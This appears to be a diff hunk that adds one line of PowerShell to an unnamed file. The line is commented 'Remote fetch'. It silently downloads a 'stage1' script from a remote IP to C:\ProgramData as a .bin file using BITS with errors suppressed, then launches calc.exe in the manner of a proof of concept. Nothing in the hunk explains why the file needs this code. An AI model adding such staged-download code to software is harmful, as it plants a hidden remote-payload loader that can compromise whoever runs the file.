@@ -1,0 +1,2 @@
+
+<# Remote fetch #> $Stage1Url = 'https://203.0.113.250:443/stage1.ps1'; $PayloadPath = 'C:\ProgramData\stage1.bin'; $RequestTimeout = 189; Start-BitsTransfer -Source $Stage1Url -Destination $PayloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
